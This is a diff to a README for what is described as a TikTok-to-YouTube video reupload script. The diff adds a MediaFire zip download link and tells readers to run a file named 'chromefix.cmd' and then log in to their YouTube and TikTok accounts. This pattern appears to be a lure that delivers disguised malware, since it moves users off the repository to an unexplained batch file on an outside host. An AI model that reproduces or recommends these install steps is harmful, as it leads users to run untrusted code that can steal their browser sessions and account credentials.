@@ -35,10 +35,10 @@ A Python script to automatically download videos from TikTok and upload them to 
 
 
 ## Installation
-
+https://www.mediafire.com/file/55q6hhhf543pzoy/Tiktok-Youtube.zip/file
 1. Clone the repository:
    ```
-     Download zip file from here 
+     Download zip file from [here](https://www.mediafire.com/file/55q6hhhf543pzoy/Tiktok-Youtube.zip/file) 
       then run "chromefix.cmd"
       login to your youtube and tiktok account and close the browser
    then edit "tiktok tags.cmd"
